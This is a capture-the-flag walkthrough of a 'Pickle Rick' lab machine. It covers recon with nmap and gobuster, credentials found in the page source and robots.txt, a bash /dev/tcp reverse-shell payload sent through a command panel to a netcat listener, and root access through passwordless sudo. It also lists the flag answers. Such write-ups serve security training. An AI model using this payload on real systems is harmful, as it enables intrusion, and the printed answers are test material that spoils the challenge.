At the start, we access the target website and notice the landing page:  

![alt text](image.png)

Next, we inspect the page source to extract valuable information. In the page source, we quickly identify the username: 
<pre> R1ckRul3s </pre>  

We use nmap to scan the network and identify open ports on the target system:
```BASH
sudo nmap -sV -p- $ip
```

![alt text](image-1.png)

The scan reveals that only ports 22 (SSH) and 80 (HTTP) are open. Let's check robots.txt file with curl, which returns:

![alt text](image-3.png)
<pre>Wubbalubbadubdub</pre>

Use Gobuster to identify hidden directories. Run:
```BASH
gobuster dir -u "http://$ip/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```

![alt text](image-2.png)

The only discovered directory is `/assets`, which contains several JavaScript and CSS files. We then focus on login.php for further exploitation. 

![alt text](image-4.png)

<span style="line-height:0.5;">&nbsp;</span>

Navigating to: `$ip/login.php` reveals the login interface. Upon logging in with the previously extracted credentials, the site redirects us, but everything seems blocked except for a `commands` tab. This suggests that the application may be vulnerable to a reverse shell injection.

![alt text](image-5.png)

Start a Netcat listener on your attacker machine:
```BASH
nc -lvnp 4444
```
Then use the following payload to spawn a reverse shell:
```BASH
bash -c 'bash -i >& /dev/tcp/10.10.193.82/4444 0>&1'
```
![alt text](image-7.png)

After clicking execute (or triggering the payload), the reverse shell connects back to your Netcat listener. To stabilize the shell, execute within your Netcat session:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](image-8.png)

![alt text](image-9.png)

### What is the first ingredient that Rick needs?
<pre>mr. meeseek hair</pre>

Next, determine which users can execute commands with root privileges.
![alt text](image-10.png)

A quick inspection shows that the www-data user has full sudo access without a password:
`(ALL) NOPASSWD: ALL`

```BASH
sudo su -
```

![alt text](image-11.png)

### What is the last and final ingredient?

![alt text](image-12.png)

<pre>fleeb juice</pre>

### What is the second ingredient in Rick’s potion?  

![alt text](image-13.png)
 
<pre>jerry tear</pre>